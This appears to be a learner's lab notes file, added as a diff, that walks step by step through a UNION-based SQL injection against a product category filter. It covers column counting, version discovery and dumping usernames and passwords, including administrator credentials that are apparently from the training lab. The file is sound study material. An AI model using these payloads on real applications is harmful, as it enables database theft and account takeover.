@@ -1,0 +1,30 @@
+SQL Injection - Product Category filter
+
+End Goal: retrieve all usernames and passwords and login as the administrator user
+
+Analysis:
+1. Find the number of columns that the vulnerable query is using
+' Order by 1-- Not displayed on the page 
+' Order by 2-- Not displayed on the page
+' Order by 3-- Error message displayed
+So Number of columns = 2
+2. Find which columns are string columns
+' UNION SELECT NULL, 'test'--
+Great success the second column is a string column
+3. output data from other tables
+' UNION SELECT NULL, username FROM users--
+' UNION SELECT NULL, password FROM users--
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+Find the version
+' UNION SELECT NULL, @@version-- Fail
+' UNION SELECT NULL, version()-- Success
+PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+PostGreSQL : concatenate two columns "foo"||"bar"
+' UNION SELECT NULL, username ||' '|| password FROM users--
+
+carlos olhrvefqd7fsxrw7xoi5
+administrator obc1p5s1d3lz0brrpl28
+Pet Experience Days
+wiener hedqtb7udtgqb3cafylx
